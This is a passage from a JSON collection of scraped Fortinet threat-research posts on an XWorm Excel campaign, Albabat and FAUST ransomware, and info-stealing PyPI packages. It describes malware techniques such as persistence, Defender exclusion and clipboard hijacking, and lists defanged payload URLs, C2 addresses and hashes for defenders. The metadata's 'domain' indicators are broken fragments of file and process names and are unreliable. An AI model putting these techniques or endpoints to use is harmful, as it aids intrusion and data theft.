of the attack. However, the infection vector was divided into more pieces, as Figure 12 shows. The dll files are extracted from image files. The data is base64-encoded and appended to a jpg file. The payload is XWorm, which we also found variants of on the GitHub repositories mentioned in the Abused Open Platforms section. The threat actors separate the malware campaign into several simple downloaders and use open platforms to avoid detection. However, this also provided clues to identify the hacker group. From the information left in the files, we also found files abused in other campaigns and the SNS platforms being abused to distribute malware. Such services not only provide a convenient environment for people but are commonly used by threat actors. The malware described in this report are detected and blocked byFortiGuard Antivirusas: VBA/Agent. ZCI!trMSIL/Injector. UWS!trVBA/Agent.4C99!tr.dldrVBS/Agent. HLI!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s freeFortinet Certified Fundamentals (FCF)in cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. gitlab[.]com/anhducratsilvergithub[.]com/Akabanwa-tomagithub[.]com/osmosieucapvipprogithub[.]com/NHTBOTgithub[.]com/1nuhongio 65[.]0[.]50[.]125103[.]85[.]247[.]6174[.]222[.]9[.]95103[.]82[.]26[.]41103[.]48[.]85[.]6 d897376e35ace588d386b9fff1ba65277172571f5d0af90f371413380996e1e470e77806d5bec502c66ef9c3ce9d0cc9294f965b15a33cf8b180749171d5b710eb64896197045b6897a141781171294d20e09a7172d8de978da09b958b2bc1d4e428edefeffb76e649961f9b25df39fdcc5c0b52b29775c012bb58d47ef88beb736f49f37da9a93ef79178344e46ea9fe98dbbf1bb8d2b06da232b0dd7fc4a4cb83c0c12fcc7b81b423cc30e9ec192ee913b309db30980442203121f6e69cfd009b9251e1b459b632dedeb23a0ce985b261b30ac8938036dbb4c93ea1ef8199be78bd2a56e5e7b1c5305724bb171c69df21b6a5fef83ccd89e88d16bb1be79b9b33b10a686db213ca3253f55133a15e83262f6fc45506b425e46f972dfadb39eacbed913a5e14c724293bb48af87ca012202ae8c7c3b2df1b4aa077924414efbd36af2c9097b9c718e035d345ad20c38c3ce66b63827d2c2b24cc3235b6eb70952575032c7eb4b3816b0e8a57ee4ea1cf19aacb32c3e2f96b8a891fe4ba2bcac python,excel FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/python-info-stealer-malicious-excel-document",
      "scraped_at": "2025-07-20T13:50:28.693913",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ypass",
          "ilebin",
          "cript",
          "est",
          "r",
          "pdate",
          "00coki",
          "ocument"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.477815699658703
    }
  },
  {
    "id": "Fortinet_24901",
    "source": "Fortinet",
    "title": "Ransomware Roundup - Albabat",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Albabat ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High Albabat, also known as White Bat, is a financially motivated ransomware variant written in Rust that identifies and encrypts files important to the user and demands a ransom to release them. It first appeared in November 2023 with the variant Version 0.1.0. Version 0.3.0 was released in late December, followed by version 0.3.3 in mid-January 2024. The Albabat ransomware appears to be distributed as rogue software, such as a fake Windows 10 digital activation tool and a cheat program for the Counter-Strike 2 game. The Albabat ransomware samples were submitted to a publicly available file scanning service, and it appears to be primarily targeting companies and individuals in Argentina, Brazil, the Czech Republic, Germany, Hungary, Kazakhstan, Russia, and the United States. But because it is being distributed as fake software, the ransomware can affect anyone. Once the Albabat ransomware is executed, it looks for files to encrypt. It avoids encrypting the following file types: Additional file types listed below are excluded from encryption in versions 0.3.0 and 0.3.3: Note that the file types highlighted in light green are excluded in version 0.3.0. The file types highlighted in light yellow are additional files excluded in version 0.3.3. Files encrypted by the Albabat ransomware are given a “.abbt” file extension. The ransomware also replaces the desktop wallpaper with its own. The Albabat ransomware’s wallpaper claims it supports Windows and Linux platforms. However, we have not been able to locate Linux samples. Since the ransomware is written in the Rust language, which can be cross-compiled from one operating system to another, it's possible that a Linux version will be released in the future. Version 0.1.0 tries to terminate Chrome.exe. Starting with version 0.3.0, the ransomware also attempts to terminate the following additional processes: taskmgr.exe powerpnt.exe winword.exe msaccess.exe cs2.exe (the game Counter Strike 2) onedrive.exe postgres.exe mysqlworkbench.exe outlook.exe windowsterminal.exe sublime_text.exe Version 0.3.0 and later also stops the following services: postgresql-x64-14 postgresql-x64-15 Starting with version 0.3.0, the ransomware may steal from or modify the following files: AppData\\Roaming\\Electrum\\wallets AppData\\Roaming\\JetBrains AppData\\Local\\Microsoft\\OneDrive C:\\Program Files (x86)\\Steam\\steamapps\\common\\Counter-Strike Global Offensive\\game\\csgo\\cfg D:\\Games\\steamapps\\common\\Counter-Strike Global Offensive\\game\\csgo\\cfg D:\\Steam\\steamapps\\common\\Counter-Strike Global Offensive\\game\\csgo\\cfg Version 0.3.3 adds the following entries to the Windows Hosts file to block access to certain sites: Once the encryption process is finished, the ransomware drops the following files: Version 0.1.0 Version 0.3.0 Version 0.3.3 The README.html file is a ransom note instructing victims to email the attacker. It demands 0.0015 Bitcoin (approximately $64 US) for file decryption. The ransom notes dropped by versions 0.1.0, 0.3.0, and 0.3.3 are significantly different except for the format. The ransom note has a translation option that uses the Google Translate service, allowing it to be translated into over 100 languages. When the translation option is selected, Portuguese is automatically selected as the translation language, which may indicate that this is the primary language of the ransomware developer. Files larger than 5MB were not encrypted in our test environments, as per the ransom note. The FAQ option opens FAQ.html, which does not differ much between variants except for item 10, which was added in version 0.3.0. The attacker’s Bitcoin wallet had no transactions at the time of our investigation. Although one of the Albabat ransomware samples instructs victims to visit a TOR site, the site was no longer accessible at the time of our investigation. Since there is no mention of data exfiltration in the ransom notes, it is likely that the TOR site was only used for ransom negotiations. Fortinet customers are already protected from this malware variant through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the Albabat ransomware samples with the following AV signatures: TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. Albabat Ransomware File IOCs e1c399c29b9379f9d1d3f17822d4496fce8a5123f57b33f00150f287740049e9 ce5c3ec17ce277b50771d0604f562fd491582a5a8b05bb35089fe466c67eef54 483e0e32d3be3d2e585463aa7475c8b8ce254900bacfb9a546a5318fff024b74 614a7f4e0044ed93208cbd4a5ab6916695e92ace392bc352415b24fe5b2d535c bfb8247e97f5fd8f9d3ee33832fe29f934a09f91266f01a5fed27a3cc96f8fbb Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-albabat",
      "scraped_at": "2025-07-20T13:50:36.305556",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ysqlworkbench",
          "askmgr",
          "nedrive",
          "indowsterminal",
          "saccess",
          "owerpnt",
          "utlook",
          "ostgres",
          "hrome",
          "AQ",
          "s2",
          "EADME",
          "inword"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "e1c399c29b9379f9d1d3f17822d4496fce8a5123f57b33f00150f287740049e9",
          "bfb8247e97f5fd8f9d3ee33832fe29f934a09f91266f01a5fed27a3cc96f8fbb",
          "483e0e32d3be3d2e585463aa7475c8b8ce254900bacfb9a546a5318fff024b74",
          "614a7f4e0044ed93208cbd4a5ab6916695e92ace392bc352415b24fe5b2d535c",
          "ce5c3ec17ce277b50771d0604f562fd491582a5a8b05bb35089fe466c67eef54"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.6682769726247988
    }
  },
  {
    "id": "Fortinet_64444",
    "source": "Fortinet",
    "title": "Another Phobos Ransomware Variant Launches Attack – FAUST",
    "text": "FortiGuard Labs Threat Research The Phobos ransomware family is a notorious group of malicious software designed to encrypt files on a victim's computer. It emerged in 2019 and has since been involved in numerous cyber attacks. This ransomware typically appends encrypted files with a unique extension and demands a ransom payment in cryptocurrency for the decryption key. FortiGuard Labs has captured and reported on several ransomware variants from the Phobos family, includingEKINGand8Base. Recently, FortiGuard Labs uncovered an Office document containing a VBA script aimed at propagating the FAUST ransomware, another variant of Phobos. The attackers utilized the Gitea service to store several files encoded in Base64, each carrying a malicious binary. When these files are injected into a system's memory, they initiate a file encryption attack. Figure 1 shows the attack chain. In this blog, we explore the different phases of file deployment and delve into the details of the delivered malware. The XLAM document we discovered contains an embedded VBA script, as illustrated in Figure 2. Upon opening the document, the script triggers PowerShell for the next stage using the “Workbook_Open()” function. It then downloads Base64-encoded data from Gitea, which can be decoded into a clean XLSX file. This file is then saved in the TEMP folder and automatically opened, misleading users into thinking the process is completed and poses no harm. Figure 3 displays the decoded code retrieved from the variable “SkSLjvNc.” The PowerShell script downloads data from hxxps://gitea[.]com/JoinPokingo/JingaPol/raw/branch/main/cfmifs_CRPT[.]txt, extracts the targeted malicious section in “cfmifs_CRPT[.]txt” using the pattern “DICK{(.*)}DICK” and decodes the result from Base64, which is shown in Figure 4. Lastly, a random folder is selected within “$env:APPDATA..\\Local,” and two randomly generated characters are appended to the folder name, giving it a new name. The executable, “AVG update.exe,” is saved in this new folder, as shown in Figure 5. The executable file “AVG update.exe” functions as a downloader. It incorporates an abundance of extraneous code to evade detection and complicate analysis. Employing a process injection technique, it allocates Read-Write-Execute (RWE) memory to inject the malicious code into a newly generated process. Additionally, the file encodes all its strings and XORs them with specific hexadecimal keys before utilization. Figure 6 shows the assembly code for obtaining a DLL name from the encoded string “blogaudit” utilizing XOR hex keys. “blogauditblo” ^ 0x29293d292439575B5A262023 = “KERNEL32. DLL” It encompasses the following functions: The attacker allocates a section within the target process's memory, inserts malicious code, and calls to the payload's entry point. FAUST Ransomware is a variant of the Phobos family, a type of malware that encrypts the files on the victim's computer. It demands a ransom in exchange for providing a decryption key. This ransomware appends the \".faust\" extension to each encrypted file and generates info.txt and info.hta within the directories housing the encrypted files. These files serve as a means to establish contact with the attackers for ransom negotiations. It checks the Mutex object to ensure only one process is running, and it adds persistence by adding a registry to “HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run “ and copying itself to two folders: “%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup and “C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup.” These folders are associated with the Windows startup configuration. The former is user-specific, launching programs at user login, while the latter is system-wide, affecting all users during system startup. They are crucial for automatically running the FAUST Ransomware. To avoid destroying the system, double-encrypting files, or encrypting its ransom information, it contains an exclusion list: Like the typical behavior of Phobos variants, FAUST ransomware keeps the decryption function for configuration. Take the exclusion list, for example. It uses the index 7 for file extensions, 8 for filenames, and 9 for directories. It also initiates multiple threads to perform various tasks. These tasks include deploying encryption, scanning logical drives, searching for network/sharing resources, scanning files individually, and explicitly seeking database-related files (such as fdb, sql, 4dd, 4dl, abs, abx, accdb, accdc, accde, adb, adf, ckp, db, db-journal, db-shm, db-wal, db2, db3, dbc, dbf, dbs, dbt, dbv, dcb, dp1, eco, edb, epim, fcd, gdb, mdb, mdf, ldf, myd, ndf, nwdb, nyf, sqlitedb, sqlite3, and sqlite). The encrypted files carry the extension “.id[<<ID>>-3512].[babylon4367@proton.me].faust.” It also launches the HTML version of the ransom note, “info.hta,” on the victim’s device. Figure 13 shows the message instructing victims to contact the attackers via email, using the specific ID as the message's title, or through a TOX message. By inspecting the TOX ID, we found that the original seller initiated the selling process in November 2023, as shown in Figure 14. Notably, the selling activity is ongoing, and users should remain vigilant against this ongoing threat. This report delved into the FAUST variant of the Phobos ransomware, providing insights into the process of downloading the payload file from an MS Excel document embedded with VBA script. Our analysis uncovered a threat actor employing a fileless attack to deploy shellcode, injecting the final FAUST payload into the victim's system. The FAUST variant exhibits the ability to maintain persistence in an environment and creates multiple threads for efficient execution. To safeguard devices from potential malware threats, users must exercise caution and refrain from opening document files from untrusted sources. The malware described in this report are detected and blocked byFortiGuard Antivirusas: VBA/Dropper. CB!trW64/Agent. ACFT!trW64/Agent. A9D5!trW64/Dloader.584B!trW32/FilecoderPhobos. C!tr.ransom FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document. We also suggest that organizations go through the freeFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Fortinet also provides an extensive portfolio of services powered by our global FortiGuard team of seasoned cybersecurity experts. The FortiGuard IP Reputation and Anti-Botnet Security Services proactively block attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. FortiRecon, a SaaS-based Digital Risk Prevention Service backed by cybersecurity experts, provides unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress, allowing customers to rapidly respond to and shut down active threats. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 426284b7dedb929129687303f1bf7e4def607f404c93f7736d17241e43f0ab3350e2cb600471fc38c4245d596f92f5444e7e17cd21dd794ba7d547e0f2d9a9d5a0a59d83fa8631d0b9de2f477350faa89499e96fd5ec07069e30992aaabe913aebe77c060f8155e01703cfc898685f548b6da12379e6aefb996dbcaac201587cc10dc2f6694414b68c10139195d7db2bb655f3afdcc1ac6885ef41ef1f0078df ransomware attack,Cara Lin FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/phobos-ransomware-variant-launches-attack-faust",
      "scraped_at": "2025-07-20T13:50:45.219904",
      "indicators": {
        "ip_address": [],
        "domain": [
          "nfo",
          "r",
          "roton",
          "pdate"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [
          "babylon4367@proton.me"
        ],
        "url": []
      },
      "threat_score": 0.35778175313059035
    }
  },
  {
    "id": "Fortinet_96602",
    "source": "Fortinet",
    "title": "Info Stealing Packages Hidden in PyPI",
    "text": "FortiGuard Labs Threat Research Affected platforms:All platforms where PyPI packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, etc. Severity level:High The Python Package Index (PyPI) is an open repository of software packages developed by the Python community to help people quickly develop or update applications. While most of the packages uploaded to PyPI are posted by dedicated individuals looking to support the Python community, threat actors also regularly post packages infected with malware. The FortiGuard Labs team uses a proprietary, AI-driven OSS malware detection system to hunt for and monitor these threats. Recently, we identified a PyPI malware author (who goes by the ID “WS”) discreetly uploading malicious packages to PyPI. We now estimate that there may be well over 2000 victims of “WS” just from the packages described below alone. The identified packages—nigpal, figflix, telerer, seGMM, fbdebug, sGMM, myGens, NewGends, and TestLibs111—exhibit attack methodologies similar to those outlined in a Checkmarxblog postpublished four months ago. The similarity suggests a possible connection to a malicious campaign from early 2023. Notably, these packages incorporate base64-encoded source code of PE or other Python scripts within their setup.py files. Depending on the victim devices’ operating system, the final malicious payload is dropped and executed when these Python packages are installed. A brief timeline of our findings about this info-stealing author is detailed below. The packages released before December 2023 are very similar to those discussed in earlier blog posts. Specifically, they deploy Whitesnake PE malware if the victim’s device runs on Windows, or they can deliver a Python script designed to steal information from Linux devices. A subtle distinction lies in the new method now being used by the Python script to transmit stolen data. Instead of relying on a single fixed URL, these new malware variants use a range of IP addresses as the destination, likely to ensure successful data transmission even if one server fails. Given the strong resemblance of these new packages to the previous ones, we will focus on analyzing the payloads from these more recent variants. Unlike earlier attacks that targeted both Windows and Linux users, this recent set of packages predominantly targets Windows users. While the executable payload for each package varies slightly from one another, they consistently aim to exfiltrate sensitive information from victims. Let’s take a brief look at a few of these payloads. Unlike the previous Whitesnake PE payloads developed using . NET, this sample manifests as a Python-compiled executable crafted using the PyInstaller tool. Upon careful examination of its contents post-extraction, the primary script file is revealed as 'main.pyc' accompanied by an 'addresses.py' counterpart. The mere presence of this counterpart raises suspicions. Upon decompiling 'main.pyc,' we can see that the code is somewhat incomplete, accentuating its clandestine nature. Red flags include copying itself to the Windows startup folder for autorun on startup. The script also probes logical drives, endeavoring to copy itself into non-removable drives. Notably, it adopts a discreet strategy by monitoring the count of its running instances, ensuring an inconspicuous profile complete with an exit strategy if the count surpasses two. Finally, the script retrieves the clipboard contents and compares them against predefined cryptocurrency address patterns. The discovery of matching patterns prompts the script to overwrite the clipboard with corresponding addresses sourced from 'addresses.py.' This could deceive unsuspecting victims into directing things like cryptocurrency transactions to an unexpected destination. This payload is an encrypted . NET executable. Upon being installed on the user’s device, the payload launches an invisible window of “cmd.exe.” It then uses \"powershell.exe\" through this window to add itself to the Windows Defender’s exclusion list to bypass the built-in security response: It then copies itself to the Windows Application folder and creates a scheduled task to run itself every hour once the device is infected: Each time the task runs, it establishes a connection to the malicious IP: 194[.]36[.]177[.]30. It uses “socket.io” to connect the server to the client. This way, if the connection is lost, it will automatically try to reconnect. The core of this payload tries to collect user information, such as the user’s IP address, the host credentials, etc.: The following strings offer more compelling evidence of the information-stealing capabilities of this payload. They reveal that the payload not only captures mouse and keyboard interactions but also acquires and transmits wallet and browser data to the remote server. Once this sample runs, we can observe data being sent to a suspicious IP address (194[.]36[.]177[.]30), as shown in Figure 12. At first glance, we might dismiss these as inconspicuous strings. However, further investigation shows this to be a .zip file shrouded in multiple layers of encryption. This raises serious concerns about its behavior. Upon decryption, we see 'PK' as the initial bytes, indicating a .zip file format. After debugging this sample, there are several indicators as to what sensitive content it may be interested in. Below are a few of the many interesting strings that were found during our analysis. Some of these strings may indicate info-stealing from different services, such as browsers, applications, and cryptocurrency services. Some examples we found included Chrome, Discord, Filezilla, and Coinbase. When we extract the .zip file, we can see some of the collected content. The author then exfiltrates this sensitive information to the server. This blog demonstrates the ability of a single malware author to disseminate numerous info-stealing malware packages into the PyPI library over time, each featuring distinct payload intricacies. Users are urged to exercise utmost caution when using open-source packages, checking for malicious content or payloads that may render targeted devices susceptible to information theft. The narrative of this particular malware author has unfolded over several months and showcases the considerable amount of havoc that has been wrought. Information-stealing malware is an increasingly pertinent and pressing subject. Safeguarding against such persistent adversaries demands a strategic and forward-thinking approach to fortify your defenses. FortiGuard AntiVirusdetects the malicious files identified in this report as nigpal-0.1 setup.py: PYTHON/Agent.c51b!trnigpal payload: (PE) MSIL/WhiteSnake. C!trnigpal payload: (Python) PYTHON/Agent.7f73!trfigflix-0.1 setup.py: PYTHON/Agent.c51b!trfigflix-0.2 setup.py: PYTHON/Agent.c51b!trfigflix payload: (PE) MSIL/WhiteSnake. C!trfigflix payload: (Python) PYTHON/Agent.7f73!trtelerer-2.0 setup.py: PYTHON/Agent.c51b!trtelerer-2.1 setup.py: PYTHON/Agent.c51b!trtelerer-2.2 setup.py: PYTHON/Agent.c51b!trtelerer-2.3 setup.py: PYTHON/Agent.c51b!trtelerer payload: W32/Kryptik. HTVT!trseGMM-1.3.1 setup.py: PYTHON/Agent.c51b!trseGMM-3.1.1 setup.py: PYTHON/Agent.c51b!trseGMM payload: W32/Kryptik. HTVT!trfbdebug-0.1 setup.py: PYTHON/Agent.c51b!trfbdebug payload (PE): MSIL/WhiteSnake. C!trfbdebug payload (Python): PYTHON/Agent.7f73!trsGMM-1.3.2 setup.py: PYTHON/Agent.c51b!trsGMM payload: W32/ClipBanker. DE!trmyGens-1.3 setup.py: PYTHON/Agent.c51b!trmyGens-1.3 payload: MSIL/Agent. ERW!tr.spyNewGends-1.3 setup.py: PYTHON/Agent.c51b!trNewGends-1.3 payload: MSIL/Agent. ERW!tr.spyTestLibs111-1.4 setup.py: PYTHON/Agent.c51b!trTestLibs111-1.5 setup.py: PYTHON/Agent.c51b!trTestLibs111-1.7 setup.py: PYTHON/Agent.c51b!trTestLibs111 payload: W32/Agent. ORR!tr.pws The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. TheFortiGuard Web FilteringService detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report that may operate as dependencies in users' projects in test phases, and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Hash (sha256) nigpal-0.1 setup.py c53d1387864ea3034bc4e19af492b3e67147d3fdc1d8b9752e24600d6919e3af PYTHON/Agent.c51b!tr nigpal payload (PE) ab75ea75d1fe5bc51ecef274a95f7b835b09a0c7c95c4227366a3d64b5dee7c0 MSIL/WhiteSnake. C!tr nigpal payload (Python) 24e07dd8c4a6fb92d842ebc168a40505bbd0421a16c13a06571910ca7a40a5a5 PYTHON/Agent.7f73!tr figflix-0.1 setup.py 41ff3fedb78c672c6d0e5e849f81c8be10c0767558fcfdf6f529215556354d9e PYTHON/Agent.c51b!tr figflix-0.2 setup.py 377e8ca04aed57a10b350d9eb4a6e64818bb69b790f33db4be0fd22589c435ad PYTHON/Agent.c51b!tr figflix payload (PE) 34e5bd67fbd9a7040dca9cae90e36013aaeda1940bb39e7fcd5d5fa9c85cadc8 MSIL/WhiteSnake. C!tr figflix payload (Python) b2bf755c4e1336f5ab36bc679d4a86e4c0d4da7b33a26b9ec8c01e179027f66b PYTHON/Agent.7f73!tr telerer-2.0 setup.py 3dcff80475ebfb9a3aa93f3cebd8f008ea64d857a7c53719f1ca047dfd050e1c PYTHON/Agent.c51b!tr telerer-2.1 setup.py dc5b74c1007bbe9acce3cddf30870766867b40e7d37264b7bdaf3b5f40747c10 PYTHON/Agent.c51b!tr telerer-2.2 setup.py f1f6501a97b9145d8dd755d25a39c1803fe54995a39fd59b2914f591d56bdc68 PYTHON/Agent.c51b!tr telerer-2.3 setup.py 8bdc674e3a41370a2d0a997b6ca673c6d646ed580400af242980a5ec374864a2 PYTHON/Agent.c51b!tr telerer payload 4fac457f8170e26643d0a4d8a0199e93d72872e1799e95f5c522a50754982079 W32/Kryptik. HTVT!tr seGMM-1.3.1 setup.py ef0e1a8378d1dd9e3cfd0d59d1969b618e15ddb4bbfaf50057670842004346e8 PYTHON/Agent.c51b!tr seGMM-3.1.1 setup.py 6fe87ab0590229d11f2d174bcf13cfbaca6f6c9dc55af84527c96de16c12c799 PYTHON/Agent.c51b!tr seGMM payload 4fac457f8170e26643d0a4d8a0199e93d72872e1799e95f5c522a50754982079 W32/Kryptik. HTVT!tr fbdebug-0.1 setup.py da0c21c66fd0dc42b1bcb06c9bd0d7e48b1b866720229712df64410eebd62199 PYTHON/Agent.c51b!tr fbdebug payload (PE) d9568da21005794d80eb6572ccce47cc766ba5fe24b2b82cd4ff2cf05d8531a2 MSIL/WhiteSnake. C!tr fbdebug payload (Python) ec9e1342b0bddbd0ef65cd37a751b3a8c3c8170cdd8cce0f0fb6815b6be26a45 PYTHON/Agent.7f73!tr sGMM-1.3.2 setup.py 8fb72c3a6a5d96f91c3dc46541331ebf0a6cf326d2353ab6f2b1c119e9907670 PYTHON/Agent.c51b!tr sGMM payload 94be6da31c5f896017af733a44b9ea00abbb35bce0a8dbcab776367234e4d818 W32/ClipBanker. DE!tr myGens-1.0 setup.py f22110ea2376082651f5f0724875e6f9d083e2be0688dc06b59206c35fa50def PYTHON/Agent.c51b!tr myGens payload 03a1621af484ff8f5c1797b25426bab656b6731dba43e31fe58fc1f1963d8484 MSIL/Agent. ERW!tr.spy NewGends-1.3 setup.py 857bc70fb5968b9f5e257e41f4be9cdd8c7135314bf6200e2cf5b60186401e7a PYTHON/Agent.c51b!tr NewGends payload 03a1621af484ff8f5c1797b25426bab656b6731dba43e31fe58fc1f1963d8484 MSIL/Agent. ERW!tr.spy TestLibs111-1.4 setup.py c9e0b8c6c5140acae2b3bf003d9ae2a69abf04253b0bd932ec97c732a4b9bf97 PYTHON/Agent.c51b!tr TestLibs111-1.5 setup.py 0e13bb49aba0878b919bc0980ce2e9e3cfa876387fcedf5af41235ab0f7a440a PYTHON/Agent.c51b!tr TestLibs111-1.7 setup.py 14cd40cce030bfca6a4c06fdadd353b5eaa092e7f73ba65308afedc04270c9b9 PYTHON/Agent.c51b!tr TestLibs111 payload 2b617277fc551b7500867ee009a0f80cbe6d5ee729bdfbf9b4f9d52164811082 W32/Agent. ORR!tr.pws 194[.]36[.]177[.]30 95[.]140[.]147[.]126[:]8080 78[.]46[.]66[.]9[:]8080 116[.]203[.]194[.]247[:]8080 206[.]189[.]109[.]146[:]80 217[.]145[.]238[.]175[:]80 164[.]90[.]185[.]9[:]443 185[.]216[.]26[.]127[:]8080 94[.]156[.]6[.]209[:]80 185[.]217[.]98[.]121[:]443 185[.]217[.]98[.]121[:]80 192[.]99[.]44[.]107[:]8080 52[.]86[.]18[.]77[:]8080 18[.]218[.]18[.]183[:]80 192[.]99[.]196[.]191[:]443 216[.]250[.]190[.]139[:]80 24[.]199[.]110[.]250[:]8080 35[.]166[.]49[.]216[:]8080 5[.]78[.]68[.]6[:]8009 44[.]228[.]161[.]50[:]443 162[.]33[.]178[.]113[:]80 103[.]226[.]125[.]218[:]80 106[.]15[.]66[.]6[:]8080 121[.]63[.]250[.]132[:]88 18[.]228[.]80[.]130[:]80 65[.]20[.]76[.]112[:]80 47[.]96[.]78[.]224[:]8080 216[.]39[.]242[.]18[:]8080 129[.]151[.]109[.]160[:]8080 168[.]138[.]211[.]88[:]8099 139[.]99[.]123[.]53[:]9191 54[.]92[.]18[.]154[:]443 135[.]181[.]98[.]45[:]8888 65[.]108[.]226[.]108[:]8080 45[.]155[.]171[.]134[:]8080 141[.]94[.]175[.]31[:]8098 116[.]202[.]101[.]219[:]8080 129[.]159[.]134[.]19[:]8080 107[.]161[.]20[.]142[:]8080 3[.]142[.]76[.]113[:]80 104[.]184[.]140[.]41[:]9000 205[.]185[.]123[.]66[:]8080 154[.]31[.]165[.]232[:]80 139[.]84[.]231[.]199[:]8080 103[.]244[.]151[.]46[:]8080 52[.]196[.]241[.]27[:]443 13[.]112[.]250[.]213[:]443 189[.]115[.]63[.]77[:]8080 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/info-stealing-packages-hidden-in-pypi",
